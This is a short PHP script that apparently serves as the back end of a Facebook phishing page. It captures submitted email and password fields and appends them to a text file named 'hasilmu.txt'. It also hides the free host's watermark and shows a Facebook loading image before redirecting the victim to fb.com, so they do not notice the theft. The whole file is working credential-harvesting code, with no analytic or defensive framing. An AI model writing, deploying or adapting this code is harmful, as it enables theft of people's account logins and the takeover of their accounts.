<?php
$file = "hasilmu.txt";
$username = $_POST['email'];
$password = $_POST['pass'];


$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "");
fwrite($handle, "$username");
fwrite($handle, " ");
fwrite($handle, "$password");
fclose($handle);
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Bergabung</title>
<meta http-equiv="Refresh" content="1; URL=fb.com"/>
<style>
img[alt*="www.000webhost.com"]{
display:none
}
</style>
</head><body>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<center><img src="https://good-horse.com/wp-content/themes/goodhorse/assets/images/facebookLoad.gif" width="100px" Height="100px/></center>
</body>
</html>
';
?>
